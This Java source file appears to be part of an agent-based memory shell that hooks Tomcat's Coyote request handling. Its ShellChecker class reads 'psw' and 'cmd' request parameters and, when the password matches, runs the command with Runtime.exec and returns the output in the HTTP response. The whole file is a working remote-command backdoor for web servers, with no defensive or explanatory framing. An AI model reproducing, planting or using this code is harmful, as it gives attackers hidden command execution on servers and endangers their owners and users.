package cn.com.x1001.hook.shell;

import cn.com.x1001.Agent;
import cn.com.x1001.http.AbstractRequest;
import cn.com.x1001.http.CoyoteRequest;
import cn.com.x1001.http.HttpResponse;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;


public class ShellChecker {


    public static void check(Object[] args, Object o) {
        //获取response对象
        HttpResponse httpResponse = new HttpResponse(args[1]);
        Object request = httpResponse.getRequest();
        CoyoteRequest coyoteRequest = new CoyoteRequest(request);
        String psw = coyoteRequest.getParameter("psw");
        String c = coyoteRequest.getParameter("cmd");
        if (psw != null && c !=null && psw.equals(Agent.password)) {
            try {
                String cmd = execute(c);
                httpResponse.write(cmd);
            } catch (Exception e) {
                //
            }

        }

    }
    public static String execute(String cmd) throws Exception {
        String result = "";
        if (cmd != null && cmd.length() > 0) {

            Process p = Runtime.getRuntime().exec(cmd);
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while (disr != null) {
                result = result + disr + "</br>";
                disr = dis.readLine();
            }
        }
        return result;
    }
}
